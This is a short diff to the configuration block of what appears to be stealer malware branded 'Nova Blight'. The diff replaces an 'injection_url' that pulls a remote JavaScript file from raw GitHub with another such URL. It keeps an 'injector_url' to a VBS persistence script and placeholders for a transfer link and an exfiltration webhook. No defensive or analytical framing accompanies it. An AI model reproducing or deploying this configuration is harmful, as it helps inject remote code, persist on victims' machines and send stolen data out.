@@ -20,7 +20,7 @@ var config = {
   creator: "@Nova Blight",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/404log/couc/refs/heads/main/index.js",
+    "https://raw.githubusercontent.com/ItsZxsko/salowwww/refs/heads/main/injjjj.js",
   injector_url:
     "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
   webhook: "%WEBHOOK%",
